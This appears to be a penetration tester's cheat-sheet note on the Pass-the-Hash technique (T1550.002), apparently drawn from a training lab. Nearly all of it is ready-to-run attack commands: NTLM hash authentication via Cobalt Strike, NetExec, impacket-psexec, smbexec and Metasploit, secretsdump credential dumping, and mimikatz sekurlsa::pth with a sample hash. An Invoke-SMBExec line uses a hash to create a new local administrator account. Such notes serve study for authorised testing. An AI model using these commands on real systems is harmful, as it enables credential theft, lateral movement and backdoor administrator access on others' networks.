**T1550.002**
PSexec will always attempt to return as NT_AUTHORITY\SYSTEM on admin accounts.

# C2
(Cobalt Strike) PtH 
- Uses mimikatz sekurlsa::pth
```bash
pth <DOMAIN>\<USER> <HASH>
```
# Linux
(NXC) PtH
```bash
nxc smb <IP> -u <USER> -d <DOMAIN> -H <HASH> 
```
(Psexec) PtH
```bash
impacket-psexec <USER>@<IP> -hashes <LM:NTLM>
```
(Psexec) User authentication
```bash
impacket-psexec <DOMAIN>/<USER>@<IP>
```
(smbexec) User authentication
```bash
smbexec <USER>:<PASS>@<IP>
```
(Metasploit) PtH
```bash
exploit/windows/smb/psexec
```
(Secretsdump) Dumping credentials using hashes
```bash
secretsdump <DOMAIN>/<USER>:@<IP> -hashes <HASH>
```
## Windows
Mimikatz
- /aes128 and /aes256 for other encryption hashes 
```bash
mimikatz.exe sekurlsa::pth /user:"<USER>" /domain:"<DOMAIN>" /ntlm:"<HASH>"

mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
![[Pasted image 20261029113946.png]]
Invoke-TheHash
```powershell
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```
![[Pasted image 20261029114122.png]]